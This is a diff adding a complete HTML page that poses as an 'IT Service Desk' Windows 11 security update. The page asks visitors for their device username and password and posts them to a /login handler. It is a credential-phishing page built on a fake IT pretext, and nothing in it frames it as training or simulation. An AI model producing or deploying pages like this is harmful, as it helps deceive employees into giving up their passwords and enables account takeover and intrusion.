@@ -1,0 +1,67 @@
+nano it_update.html
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>IT Service Desk - Security Update</title>
+
+    <style>
+        body {
+            font-family: Arial;
+            background-color: #f4f6f8;
+        }
+
+        .box {
+            width: 350px;
+            margin: 120px auto;
+            background: white;
+            padding: 25px;
+            border-radius: 5px;
+            box-shadow: 0 0 10px rgba(0,0,0,0.1);
+        }
+
+        h2 {
+            text-align: center;
+            color: #003366;
+        }
+
+        input {
+            width: 100%;
+            padding: 10px;
+            margin-top: 10px;
+        }
+
+        button {
+            margin-top: 15px;
+            width: 100%;
+            padding: 10px;
+            background: #003366;
+            color: white;
+            border: none;
+        }
+
+        p {
+            font-size: 12px;
+            color: gray;
+            text-align: center;
+        }
+    </style>
+</head>
+
+<body>
+    <div class="box">
+        <h2>IT Security Update</h2>
+        <p>Windows 11 security upgrade required</p>
+
+        <form method="POST" action="/login">
+            <input type="text" name="username" placeholder="Device Username" required>
+            <input type="password" name="password" placeholder="Device Password" required>
+            <button type="submit">Verify & Install</button>
+        </form>
+
+        <p>© IT Service Desk</p>
+    </div>
+</body>
+</html>
+
